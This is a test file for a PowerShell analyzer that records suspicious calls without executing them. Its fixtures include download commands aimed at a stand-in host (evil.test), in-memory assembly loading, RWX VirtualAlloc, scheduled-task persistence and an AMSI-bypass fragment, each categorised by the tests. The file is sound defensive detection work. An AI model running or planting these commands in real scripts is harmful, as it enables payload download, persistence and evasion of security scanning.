import { describe, expect, it } from 'vitest';

import { analyze } from '../../analyze';

const events = async (source: string) => (await analyze(source)).events;
const signatures = async (source: string) => (await events(source)).map((e) => e.signature);

describe('network calls are recorded, never performed', () => {
  it('records DownloadString with its URL', async () => {
    const list = await events(`(New-Object Net.WebClient).DownloadString('http://evil.test/a')`);
    const hit = list.find((e) => e.signature === 'Net.WebClient.DownloadString');
    expect(hit?.category).toBe('network');
    expect(hit?.args[0]).toContain('http://evil.test/a');
  });

  it('records DownloadFile with both URL and destination', async () => {
    const list = await events(
      String.raw`(New-Object Net.WebClient).DownloadFile('http://evil.test/a.exe','C:\Temp\a.exe')`,
    );
    const hit = list.find((e) => e.signature === 'Net.WebClient.DownloadFile');
    expect(hit?.args).toHaveLength(2);
    expect(hit?.args[0]).toContain('evil.test');
    expect(hit?.args[1]).toContain('a.exe');
  });

  it.each([
    ['Invoke-WebRequest', 'Invoke-WebRequest -Uri http://evil.test/a'],
    ['Invoke-RestMethod', 'irm http://evil.test/a'],
    ['Start-BitsTransfer', 'Start-BitsTransfer -Source http://evil.test/a'],
  ])('records %s', async (signature, source) => {
    expect(await signatures(source)).toContain(signature);
  });
});

describe('other host categories', () => {
  it.each([
    ['Start-Process', String.raw`Start-Process "C:\a.exe"`, 'process'],
    ['Add-Type', 'Add-Type -MemberDefinition $sig -Name W', 'assembly'],
    ['Reflection.Assembly::Load', '[Reflection.Assembly]::Load($b)', 'assembly'],
    ['VirtualAlloc', '$x = VirtualAlloc(0,0x1000,0x3000,0x40)', 'assembly'],
    ['schtasks', 'schtasks /create /tn x /tr y', 'persistence'],
    ['WMI query', 'Get-WmiObject Win32_ComputerSystem', 'wmi'],
    ['AMSI bypass', '[Ref].Assembly.GetType("...AmsiUtils")', 'evasion'],
    ['Start-Sleep', 'Start-Sleep -Seconds 30', 'timing'],
  ])('records %s under the right category', async (signature, source, category) => {
    const list = await events(source);
    const hit = list.find((e) => e.signature === signature);
    expect(hit, `${signature} not recorded`).toBeDefined();
    expect(hit!.category).toBe(category);
  });
});

describe('stubs are never confused with gaps', () => {
  // Spec section 7: STUB_BY_DESIGN is working as intended and must never
  // reach the implementation queue, or the queue becomes noise.
  it('keeps host calls out of the actionable queue', async () => {
    const r = await analyze(`(New-Object Net.WebClient).DownloadString('http://evil.test/a')`);

    expect(r.gaps.some((g) => g.kind === 'STUB_BY_DESIGN')).toBe(true);
    expect(r.actionableGaps.every((g) => g.kind === 'GAP')).toBe(true);
    expect(
      r.actionableGaps.some((g) => g.signature === 'Net.WebClient.DownloadString'),
    ).toBe(false);
  });

  it('deduplicates a call repeated in one layer', async () => {
    const source = `
      (New-Object Net.WebClient).DownloadString('http://a.test/1')
      (New-Object Net.WebClient).DownloadString('http://a.test/1')
    `;
    const hits = (await events(source)).filter(
      (e) => e.signature === 'Net.WebClient.DownloadString',
    );
    expect(hits).toHaveLength(1);
  });
});

describe('a clean script records nothing', () => {
  it('has no events for an ordinary command', async () => {
    expect(await signatures('Write-Host "hello"')).toEqual([]);
  });
});
